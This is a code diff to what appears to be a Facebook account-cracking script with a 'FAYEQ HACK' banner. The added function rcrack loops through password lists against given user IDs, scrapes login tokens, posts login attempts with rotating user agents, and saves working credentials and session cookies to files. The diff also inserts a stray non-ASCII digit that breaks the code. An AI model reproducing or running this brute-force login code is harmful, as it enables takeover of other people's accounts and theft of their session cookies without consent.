@@ -156,11 +156,11 @@ prox=open('socks5.txt','r').read().splitlines()
 
 logo=("""                  
 
- \33[1;30m███████████╗     \033[1;31m██          ██╗██████   \033[1;32m█████████║
- \33[1;30m██╔══██╔══██╗\033[1;31m██        ██║██╔═══   \033[1;32m ██                            ██║
- \33[1;30m████████████║\033[1;31m█████║█████║   \033[1;32m██                              ██ ║ 
- \33[1;30m██╔══██╔══██║\033[1;31m██║ ╝██╔══╝    \033[1;32m██                 █       ██║
- \33[1;30m██║     ██║        ██║\033[1;31m███║██████║\033[1;32m████████║
+ \33[1;30m██████     █████╗     \033[1;31m██          ██╗██████   \033[1;32m   █████████║
+ \33[1;30m██╔══   ██╔══██╗   \033[1;31m██        ██║██╔═══   \033[1;32m ██                            ██║
+ \33[1;30m█████   ███████║   \033[1;31m  █████║ █████║  \033[1;32m ██                              ██ ║ 
+ \33[1;30m██╔══   ██╔══██║   \033[1;31m       ██║ ╝   ██╔══╝      \033[1;32m ██                 █   ██║
+ \33[1;30m██║           ██║        ██║   \033[1;31m     ███║      ██████║  \033[1;32m  ████████║
 \033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗                       \033[1;33m 
 ╠══[\033[1;33m[•] AUTHOR   \33[0;m:\033[1;35m FAYEQ \033[1;36mHACK
 ╠══[\033[1;32m[•] FACEBOOK \033[1;32m:\033[1;32m FAYEQ \033[1;33mNASEH
@@ -265,7 +265,7 @@ def bangla():
 		b2()
 	if riaz1 =='3':
 		riaz()
-
+۳
 def m1():
     user=[]
     os.system('clear')
@@ -445,6 +445,81 @@ def b2():
     print('THE PROCESS HAS BEEN COMPLETED')
     input('PRESS ENTER TO BACK ')
     riaz()
+
+
+
+import random
+import requests
+import sys
+import re 
+
+def rcrack(uid, pwx, tl):
+    global loop
+    global cps
+    global oks
+    try:
+        while True:
+            for ps in pwx:
+                pro = random.choice(ugen)
+                session = requests.Session()
+                sys.stdout.write(f'\r[\033[1;97mBM-KARWAN\033[1;97m] %s|\33[1;32mOK:- %s \r' % (loop, len(oks)))
+                sys.stdout.flush()
+                free_fb = session.get('https://free.facebook.com').text
+                log_data = {
+                    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+                    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+                    "try_number": "0",
+                    "unrecognized_tries": "0",
+                    "email": uid,
+                    "pass": ps,
+                    "login": "Log In"
+                }
+                header_freefb = {
+                    'authority': 'mbasic.facebook.com',
+                    'method': 'GET',
+                    'scheme': 'https',
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'cache-control': 'max-age=0',
+                    'dpr': '2',
+                    'sec-ch-prefers-color-scheme': 'dark',
+                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+                    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+                    'sec-ch-ua-mobile': '?1',
+                    'sec-ch-ua-model': '"SM-A102N"',
+                    'sec-ch-ua-platform': '"Android"',
+                    'sec-ch-ua-platform-version': '"10.0.0"',
+                    'sec-fetch-dest': 'document',
+                    'sec-fetch-mode': 'navigate',
+                    'sec-fetch-site': 'none',
+                    'sec-fetch-user': '?1',
+                    'upgrade-insecure-requests': '1',
+                    'user-agent': pro,
+                }
+                lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/', data=log_data, headers=header_freefb).text
+                log_cookies = session.cookies.get_dict().keys()
+
+                if 'c_user' in log_cookies:
+                    coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
+                    cid = coki[151:166]
+                    print('\033[1;32m[KARWAN-OK] ' + uid + ' | ' + ps + '\n\033[1;33m COOKIE = \033[1;34m' + coki + '  ''  \033[0;97m')
+                    print(50 * '\033[1;35m━')
+                    open('KARWAN-OK.txt', 'a').write(uid + ' | ' + ps + '\n')
+                    oks.append(uid)
+                    break
+                elif 'checkpoint' in log_cookies:
+                    coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
+                    cid = coki[141:152]
+                    open('KARWAN-CP.txt', 'a').write(uid + ' | ' + ps + '\n')
+                    cps.append(cid)
+                    break
+                else:
+                    continue
+            loop += 1
+    except:
+        pass
 
 
 
